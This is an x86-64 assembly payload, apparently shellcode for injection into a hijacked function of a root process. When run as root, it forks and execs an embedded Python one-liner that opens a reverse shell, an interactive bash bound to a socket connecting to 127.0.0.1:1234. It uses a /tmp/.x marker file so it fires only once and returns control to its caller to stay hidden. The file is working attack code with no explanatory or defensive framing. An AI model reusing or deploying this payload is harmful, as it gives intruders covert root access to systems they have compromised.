		BITS 64
		[SECTION .text]
		global _start

_start:
		;; exit if getuid() != 0
		mov		rax, 0x66
		syscall
		test	rax, rax
		jne		exit

		;; access("/tmp/.x", R_OK)
		push    rdi
		push    rsi
		mov     rsi, 0x00782e2f706d742f
		push    rsi
		mov     rdi, rsp
		mov     rsi, 4
		mov     rax, 0x15
		syscall
		test    rax, rax
		pop     rsi
		pop     rsi
		pop     rdi
		je      exit

		;; fork
		mov     rax, 0x39
		syscall
		test    rax, rax
		jne     exit

		push    rax
		mov     rdx, rsp		; arg3 [ NULL ]

		mov     rbx, 0x6e6f687479702fff
		shr     rbx, 0x8
		push    rbx
		mov     rbx, 0x6e69622f7273752f
		push    rbx
		mov     rdi, rsp		; arg1 "/usr/bin/python"

		push    rax				; NULL
		call    python
		push    rcx				; "-c..."
		push    rdi				; "/usr/bin/python"
		mov     rsi, rsp		; arg2 [ "/usr/bin/python", "-c...", NULL ]

		;; exec
		mov     al, 0x3b
		syscall

		;; exit
		mov     al, 0x3c
		syscall

exit:
		;; get callee address (pushed on the stack by the call instruction)
		pop     rax
		;; execute missed instructions (patched by exploit)
		db	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
		;; return to callee
		jmp     rax

python:
		;; 		mov     rcx, rip+8
		lea     rcx, [rel $ +8]
		ret
		db      '-cimport os,socket;open("/tmp/.x","w");s=socket.socket(2,1);s.connect(("127.000.000.001",1234));[os.dup2(s.fileno(),i) for i in range(3)];os.execvp("/bin/bash",["bash","-i"])'
		db      0
